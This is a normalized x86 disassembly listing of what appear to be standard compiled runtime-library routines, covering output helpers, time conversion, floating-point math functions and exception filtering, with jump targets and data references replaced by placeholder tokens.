mov ecx [ esi ]
and [ esi ] 0x0
mov [ ebp - 0x8 ] ecx
cmp edi eax
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
pop edi
pop esi
test ecx ecx
je r-xdata
inc edi
cmp edi [ ebp - 0x4 ]
jne r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov [ esi ] ecx
push eax
movzx eax [ edi ]
mov ecx ebx
push eax
call sub_4281b4
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x8 ]
push eax
push 0x3f
mov ecx ebx
call sub_4281b4
mov eax [ ebp + 0x10 ]
sub_428a6e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx ecx
mov eax [ ebx ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ esi ]
and [ esi ] 0x0
lea eax [ edi + eax * 2 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
pop edi
pop esi
test ecx ecx
je r-xdata
add edi 0x2
cmp edi [ ebp - 0x4 ]
jne r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov [ esi ] ecx
push eax
movzx eax [ edi ]
mov ecx ebx
push eax
call sub_4281f1
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x8 ]
push eax
push 0x3f
mov ecx ebx
call sub_4281f1
mov eax [ ebp + 0x10 ]
sub_428afb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov eax ecx
mov [ ebp - 0x8 ] eax
mov ecx [ edi ]
and [ edi ] 0x0
mov eax [ eax ]
mov [ ebp - 0x4 ] ecx
mov esi [ eax + 0x4 ]
cmp [ eax + 0x8 ] esi
jne r-xdata
sub esi [ eax + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp esi ebx
jb r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
push [ eax ]
call sub_40d8e0
mov ecx [ ebp - 0x8 ]
add esp 0xc
mov eax [ ecx ]
add [ eax ] esi
mov eax [ ecx ]
add [ eax + 0x8 ] esi
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x0
mov eax [ ebp + 0x10 ]
je r-xdata
mov esi ebx
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
cmp esi ebx
je r-xdata
add [ eax ] ebx
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
add [ eax ] esi
or [ eax ] 0xffffffff
jmp r-xdata
pop ebx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
test ecx ecx
je r-xdata
mov [ edi ] ecx
sub_428b8e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x14 ]
mov eax ecx
push edi
mov [ ebp - 0x8 ] eax
mov ecx [ ebx ]
and [ ebx ] 0x0
mov edx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp [ edx + 0x8 ] edi
jne r-xdata
sub edi [ edx + 0x8 ]
mov eax [ ebp + 0xc ]
cmp edi eax
jb r-xdata
cmp [ edx + 0xc ] 0x0
je r-xdata
push esi
lea esi [ edi + edi ]
push esi
push [ ebp + 0x8 ]
push [ edx ]
call sub_40d8e0
mov ecx [ ebp - 0x8 ]
add esp 0xc
mov eax [ ecx ]
add [ eax ] esi
mov eax [ ecx ]
pop esi
add [ eax + 0x8 ] edi
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x0
mov eax [ ebp + 0x10 ]
je r-xdata
mov edi eax
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
mov ecx [ ebp + 0xc ]
add [ eax ] ecx
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
add [ eax ] edi
or [ eax ] 0xffffffff
jmp r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x10
test ecx ecx
je r-xdata
mov [ ebx ] ecx
sub_428c51
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] eax
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edx
call sub_418074
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_428cc8
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] eax
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edx
call sub_418024
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_428d3f
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] eax
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edx
call sub_4180c4
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_428db6
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] eax
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edx
call sub_41804c
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_428e2d
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] eax
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edx
call sub_41809c
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_428ea4
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] eax
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edx
call sub_417ffc
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_428f1b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418302
add esp 0x20
pop ebp
retn
sub_428f42
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418406
add esp 0x20
pop ebp
retn
sub_428f69
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418b92
add esp 0x1c
pop ebp
retn
sub_428f8d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41880f
add esp 0x1c
pop ebp
retn
sub_428fb1
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418e93
add esp 0x1c
pop ebp
retn
sub_428fd5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418d0e
add esp 0x1c
pop ebp
retn
sub_428ff9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4189cc
add esp 0x1c
pop ebp
retn
sub_42901d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418f0b
add esp 0x1c
pop ebp
retn
sub_429041
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_4290b5
pop ecx
pop ecx
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ecx ] eax
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
sub_429073
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
push edi
lea edi [ ebp - 0x10 ]
stosd [ edi ]
push 0x1
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
push eax
call sub_429130
pop ecx
pop ecx
pop edi
cmp eax 0x1
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
or eax 0xffffffff
mov edx eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
sub_4290b5
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor eax eax
jmp r-xdata
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
push ebx
push eax
call sub_430aac
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
sub ecx 0xd53e8000
push 0x0
push 0x989680
sbb eax 0x19db1de
push eax
push ecx
call sub_449820
mov [ ebp - 0x4 ] ebx
pop ebx
test edx edx
jl r-xdata
pop esi
mov esp ebp
pop ebp
retn
imul ecx ecx 0x64
mov [ esi ] eax
xor eax eax
inc eax
mov [ esi + 0x4 ] ecx
jg r-xdata
cmp eax 0x7fffd27f
ja r-xdata
sub_429130
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor eax eax
jmp r-xdata
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
push ebx
push eax
call sub_430aac
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
sub ecx 0xd53e8000
push 0x0
push 0x989680
sbb eax 0x19db1de
push eax
push ecx
call sub_449820
mov [ ebp - 0x4 ] ebx
pop ebx
cmp edx 0x7
jl r-xdata
pop esi
mov esp ebp
pop ebp
retn
imul ecx ecx 0x64
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] edx
inc eax
mov [ esi + 0x8 ] ecx
jg r-xdata
cmp eax 0x93406fff
ja r-xdata
sub_4291af
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_4290b5
pop ecx
pop ecx
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ecx ] eax
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
sub_4291e1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
push edi
lea edi [ ebp - 0x10 ]
stosd [ edi ]
push 0x1
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
push eax
call sub_429130
pop ecx
pop ecx
pop edi
cmp eax 0x1
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
or eax 0xffffffff
mov edx eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
sub_429260
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
sub esp 0x8
movq [ esp ] xmm0
call sub_4360ef
fstp [ esp ]
movq xmm0 [ esp ]
add esp 0x8
retn
pextrw eax xmm0 0x3
and ax 0x7fff
sub ax 0x3030
cmp ax 0x10c5
ja r-xdata
jg r-xdata
movlpd xmm1 [ r--data ]
mulsd xmm1 xmm0
movlpd xmm2 [ r--data ]
cvtsd2si edx xmm1
addsd xmm1 xmm2
movlpd xmm3 [ r--data ]
subsd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm1
unpcklpd xmm1 xmm1
add edx 0x1c7610
movsd xmm4 xmm0
and edx 0x3f
movapd xmm5 [ r--data ]
lea eax [ r--data ]
shl edx 0x5
add eax edx
mulpd xmm2 xmm1
subsd xmm0 xmm3
mulsd xmm1 [ r--data ]
subsd xmm4 xmm3
movlpd xmm7 [ eax + 0x8 ]
unpcklpd xmm0 xmm0
movsd xmm3 xmm4
subsd xmm4 xmm2
mulpd xmm5 xmm0
subpd xmm0 xmm2
movapd xmm6 [ r--data ]
mulsd xmm7 xmm4
subsd xmm3 xmm4
mulpd xmm5 xmm0
mulpd xmm0 xmm0
subsd xmm3 xmm2
movapd xmm2 [ eax ]
subsd xmm1 xmm3
movlpd xmm3 [ eax + 0x18 ]
addsd xmm2 xmm3
subsd xmm7 xmm2
mulsd xmm2 xmm4
mulpd xmm6 xmm0
mulsd xmm3 xmm4
mulpd xmm2 xmm0
mulpd xmm0 xmm0
addpd xmm5 [ r--data ]
mulsd xmm4 [ eax ]
addpd xmm6 [ r--data ]
mulpd xmm5 xmm0
movsd xmm0 xmm3
addsd xmm3 [ eax + 0x8 ]
mulsd xmm1 xmm7
movsd xmm7 xmm4
addsd xmm4 xmm3
addpd xmm6 xmm5
movlpd xmm5 [ eax + 0x8 ]
subsd xmm5 xmm3
subsd xmm3 xmm4
addsd xmm1 [ eax + 0x10 ]
mulpd xmm6 xmm2
addsd xmm5 xmm0
addsd xmm3 xmm7
addsd xmm1 xmm5
addsd xmm1 xmm3
addsd xmm1 xmm6
unpckhpd xmm6 xmm6
addsd xmm1 xmm6
addsd xmm4 xmm1
movapd xmm0 xmm4
retn
pextrw eax xmm0 0x3
and ax 0x7fff
pinsrw xmm0 eax 0x3
movlpd xmm1 [ r--data ]
subsd xmm1 xmm0
movapd xmm0 xmm1
retn
sub_429420
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
sub esp 0x8
movq [ esp ] xmm0
call sub_43621f
fstp [ esp ]
movq xmm0 [ esp ]
add esp 0x8
retn
pextrw eax xmm0 0x3
and ax 0x7fff
sub ax 0x3030
cmp ax 0x10c5
ja r-xdata
jg r-xdata
movlpd xmm1 [ r--data ]
mulsd xmm1 xmm0
movlpd xmm2 [ r--data ]
cvtsd2si edx xmm1
addsd xmm1 xmm2
movlpd xmm3 [ r--data ]
subsd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm1
unpcklpd xmm1 xmm1
add edx 0x1c7600
movsd xmm4 xmm0
and edx 0x3f
movapd xmm5 [ r--data ]
lea eax [ r--data ]
shl edx 0x5
add eax edx
mulpd xmm2 xmm1
subsd xmm0 xmm3
mulsd xmm1 [ r--data ]
subsd xmm4 xmm3
movlpd xmm7 [ eax + 0x8 ]
unpcklpd xmm0 xmm0
movsd xmm3 xmm4
subsd xmm4 xmm2
mulpd xmm5 xmm0
subpd xmm0 xmm2
movapd xmm6 [ r--data ]
mulsd xmm7 xmm4
subsd xmm3 xmm4
mulpd xmm5 xmm0
mulpd xmm0 xmm0
subsd xmm3 xmm2
movapd xmm2 [ eax ]
subsd xmm1 xmm3
movlpd xmm3 [ eax + 0x18 ]
addsd xmm2 xmm3
subsd xmm7 xmm2
mulsd xmm2 xmm4
mulpd xmm6 xmm0
mulsd xmm3 xmm4
mulpd xmm2 xmm0
mulpd xmm0 xmm0
addpd xmm5 [ r--data ]
mulsd xmm4 [ eax ]
addpd xmm6 [ r--data ]
mulpd xmm5 xmm0
movsd xmm0 xmm3
addsd xmm3 [ eax + 0x8 ]
mulsd xmm1 xmm7
movsd xmm7 xmm4
addsd xmm4 xmm3
addpd xmm6 xmm5
movlpd xmm5 [ eax + 0x8 ]
subsd xmm5 xmm3
subsd xmm3 xmm4
addsd xmm1 [ eax + 0x10 ]
mulpd xmm6 xmm2
addsd xmm5 xmm0
addsd xmm3 xmm7
addsd xmm1 xmm5
addsd xmm1 xmm3
addsd xmm1 xmm6
unpckhpd xmm6 xmm6
addsd xmm1 xmm6
addsd xmm4 xmm1
movapd xmm0 xmm4
retn
shr ax 0x4
cmp ax 0xcfd
jne r-xdata
movlpd xmm3 [ r--data ]
mulsd xmm3 xmm0
subsd xmm3 xmm0
mulsd xmm3 [ r--data ]
retn
mulsd xmm0 [ r--data ]
retn
sub_4295f0
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
movq [ esp ] xmm0
call sub_436514
fstp [ esp ]
movq xmm0 [ esp ]
add esp 0x8
retn
fnstcw [ esp ]
movzx eax [ esp ]
and eax 0x7f
cmp eax 0x7f
jne r-xdata
pextrw eax xmm0 0x3
mov ecx eax
and eax 0x7ff0
cmp eax 0x7ff0
je r-xdata
mov eax ecx
and eax 0xf
jne r-xdata
mov eax ecx
and eax 0x8000
jne r-xdata
movq [ esp ] xmm0
or [ esp + 0x6 ] 0x8
mov edx 0x3f5
jmp r-xdata
pextrw eax xmm0 0x2
and eax 0xffff
jne r-xdata
movq [ esp ] xmm0
cmp [ esp ] 0x0
jne r-xdata
sqrtsd xmm0 xmm0
add esp 0x8
retn
sub esp 0x10
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x10
mov [ esp + 0x8 ] edx
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_4362b2
movlpd xmm0 [ esp + 0x10 ]
add esp 0x18
retn
pextrw eax xmm0 0x1
and eax 0xffff
jne r-xdata
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0xfff80000
mov edx 0x31
cmp ecx 0x8000
jne r-xdata
pextrw eax xmm0 0x0
and eax 0xffff
je r-xdata
pextrw eax xmm0 0x2
cmp eax 0x0
jne r-xdata
jmp r-xdata
sub_42971e
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_42975f
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_4297a7
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_4297eb
mov esi eax
test esi esi
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
sub_4297eb
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
push 0x0
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx esi
and ecx 0x1f
xor esi [ rw-data ]
ror esi cl
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_429834
mov eax esi
call sub_40d2a6
retn
sub_42983d
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
push 0x0
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx esi
and ecx 0x1f
xor esi [ rw-data ]
ror esi cl
mov [ ebp - 0x1c ] esi
push [ ebp + 0x8 ]
call sub_42971e
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_429894
mov eax esi
call sub_40d2a6
retn
sub_4298a8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x90 ]
cmp eax ecx
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
pop ebp
retn
add eax 0xc
cmp eax ecx
jne r-xdata
cmp [ eax ] edx
je r-xdata
sub_4298cc
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
je r-xdata
push [ ebp + 0xc ]
push eax
call sub_4298ec
pop ecx
pop ecx
pop ebp
retn
xor eax eax
pop ebp
retn
sub_4298ec
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_42faa1
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov ecx edx
push ebx
xor ebx ebx
push edi
lea eax [ edx + 0x90 ]
cmp edx eax
je r-xdata
mov ecx ebx
mov edi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
mov edi [ ecx + 0x8 ]
test edi edi
jne r-xdata
test ecx ecx
je r-xdata
add ecx 0xc
cmp ecx eax
jne r-xdata
pop edi
pop ebx
cmp edi 0x5
jne r-xdata
cmp [ ecx ] edi
je r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ecx + 0x8 ] ebx
inc eax
jmp r-xdata
or eax 0xffffffff
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
push [ ecx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx edi
call [ r--data ]
call edi
lea eax [ edx + 0x24 ]
lea edx [ eax + 0x6c ]
jmp r-xdata
cmp eax edx
jne r-xdata
mov [ eax + 0x8 ] ebx
add eax 0xc
mov ebx [ esi + 0x8 ]
mov eax 0xc0000091
cmp [ ecx ] eax
ja r-xdata
cmp [ ecx ] 0xc0000092
je r-xdata
je r-xdata
mov [ esi + 0x8 ] 0x8a
cmp [ ecx ] 0xc0000093
je r-xdata
mov [ esi + 0x8 ] 0x84
jmp r-xdata
cmp [ ecx ] 0xc000008d
je r-xdata
